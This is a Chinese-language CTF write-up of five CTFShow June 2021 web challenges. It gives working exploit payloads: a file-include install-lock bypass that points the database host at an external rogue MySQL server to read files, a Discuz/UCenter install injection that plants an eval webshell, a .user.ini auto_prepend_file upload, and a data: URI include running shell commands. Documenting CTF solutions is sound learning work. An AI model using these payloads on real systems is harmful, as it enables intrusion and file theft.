# CTFShow2021六月赛Web



## baby_captcha

嗯。。。阴间题。。。。呜呜呜

就是直接爆破，先听一个正确的验证码，然后直接bp爆破，别管302，爆破正确了会直接返回200：

![pic7](D:\this_is_feng\github\CTF\Web\picture\pic7.png)

![pic8](D:\this_is_feng\github\CTF\Web\picture\pic8.png)

爆破的脚本也在题目的首页给了，是github上的password500。



## ctfshowcms

我出的一个简单的代码审计，取自某个新手入门审计的CMS。其实真正的对于渗透利用不大，但是感觉这种思路挺有意思的，很适合用来当CTF题目来出。



index.php存在一个任意的php文件包含：

```php
$want = addslashes($_GET['feng']);
$want = $want==""?"index":$want;

include('files/'.$want.".php");
```

因为php版本不是那么低，没法造成截断之类的，所以没法直接任意读。

admin.php里没有利用，但是有比较微小的提示：

```php
    }else if($choice ==="giveMeTheYellowPicture"){
        echo "http://127.0.0.1:3306/";
```

提示了本地要利用数据库，其实后面也挺明显的了。

/install/index.php的话有安装锁的检测：

```php
if(file_exists("installLock.txt")){
    echo "你已经安装了ctfshowcms，请勿重复安装。";
    exit;
}
```

这里用的是相对路径，直接安装的话没法二次安装。但是考虑到入口的index.php并不在install目录下，如果利用上面的文件包含，则可以利用路径的问题绕过安装锁的检测，进行二次安装。

安装的代码也很少，有用的就这些：

```php
// 连接数据库
$db = mysql_connect ( $dbhost, $dbuser, $dbpwd )  or die("数据库连接失败");
// 选择使用哪个数据库
$a = mysql_select_db ( $dbname, $db );
// 数据库编码方式
$b = mysql_query ( 'SET NAMES ' . 'utf-8', $db );
if(file_exists("ctfshow.sql")){
    echo "正在写入数据库！";
}else{
    die("sql文件不存在");
}
$content = "<?php
\$DB_HOST='".$dbhost."';
\$DB_USER='".$dbuser."';
\$DB_PWD='".$dbpwd."';
\$DB_NAME='".$dbname."';
?>
";
file_put_contents(ROOT_PATH."/data/settings.php",$content);
echo "数据库设置写入成功！~"."<br>";
$of = fopen(ROOT_PATH.'/install/installLock.txt','w');
if($of){
    fwrite($of,"ctfshowcms");
}
echo "安装成功！";
```

师傅们可以尝试settings.php写马，但是这里：

```php
if(file_exists("ctfshow.sql")){
    echo "正在写入数据库！";
}else{
    die("sql文件不存在");
}
```

之前通过相对路径进行了二次安装，那么这里的话就一定会`die`了，没法成功写马，因此二次安装能利用到得代码就只有这三行：

```php
// 连接数据库
$db = mysql_connect ( $dbhost, $dbuser, $dbpwd )  or die("数据库连接失败");
// 选择使用哪个数据库
$a = mysql_select_db ( $dbname, $db );
// 数据库编码方式
$b = mysql_query ( 'SET NAMES ' . 'utf-8', $db );
```

存在一个数据库任意连接得问题，可以构造一个恶意的mysql服务端来读取任意文件。这个姿势也不多说了，最近的比赛见的也挺多的了，参考文章：

https://www.modb.pro/db/51823

payload:

```
http://www.xxxx.com?feng=../install/index

user=1&password=1&dbhost=118.31.168.198:39222&dbuser=1&dbpwd=1&dbname=1&dbport=1
```

我的恶意mysql服务端扔在了39222端口。



感觉也算是一种新的思路叭，我觉得很多的CMS可能都逃不掉这种问题，只要能二次安装，要么能配置文件写shell，要么存在mysql恶意服务端的连接来实现任意文件读取，但是我几乎还没发现对于一些CMS二次安装的审计中有提到这种利用，所以拿来出了题。



## 应该不难

直接查一下已有的洞，查到了这个install写shell：

https://zhuanlan.zhihu.com/p/39793706

直接打：

```
step=3&install_ucenter=yes&dbinfo%5Bdbhost%5D=localhost&dbinfo%5Bdbname%5D=ultrax&dbinfo%5Bdbuser%5D=root&dbinfo%5Bdbpw%5D=root&dbinfo%5Btablepre%5D=pre_');eval($_POST[0]);//&dbinfo%5Badminemail%5D=admin%40admin.com&admininfo%5Busername%5D=admin&admininfo%5Bpassword%5D=123456&admininfo%5Bpassword2%5D=123456&admininfo%5Bemail%5D=admin%40admin.com&submitname=%E4%B8%8B%E4%B8%80%E6%AD%A5
```

```
http://2409f9a7-af91-4c18-827c-0f93d4c0babf.challenge.ctf.show:8080/uc_server/data/config.inc.php

0=system("cat /flag");
```





## baby_php

有点离谱得题目，关键在这里：

```php
$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);  
```

很明显要传文件，想办法绕这里：

```php
if($action==='upload'){                                                 
    die('Permission denied');                                           
}                                                                       
                                                                        
switch ($action) {                                                      
    case 'upload':                                                      
```

`switch`那里用得是弱类型比较，但是很明显得就是，我们传入得`$_GET['a']`是一个字符串，字符串与字符串之间没法弱类型比较（我的意思是就本题来说不涉及数字）。

查一下：

![pic6](D:\this_is_feng\github\CTF\Web\picture\pic6.png)

会发现能跟字符串松散比较返回	`true`的只有`true`,0,还有字符串本身。

注意一下这个：`$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);` 注意`highlight_file`的返回值：

> 高亮成功返回 TRUE，否则返回 FALSE。



所以其实这题可以不用传a，默认都是进`case upload`的。

然后就是正常的文件上传了，传一下`.user.ini`，然后传脚本即可：

```
content=auto_prepend_file="1.txt"&name=.user.ini

content=<?=system("cat /*");?>&name=/var/www/html/1.txt
```



## 完美的缺点

想了一下，我想利用这里：

```php
if(file_get_contents('php://input')==='ctfshow'){
    include($file_name);
}
```

```php
$file_name = substr($_GET['file_name'], 0,16);
```

试了一下，正好16个字符：

```php
data:,<?=`nl *`;
```

```
?file_name=data:,<?=`nl%20*`;

ctfshow
```



而且我好像是唯一一个预期解，其他的师傅用的都是远程文件包含。
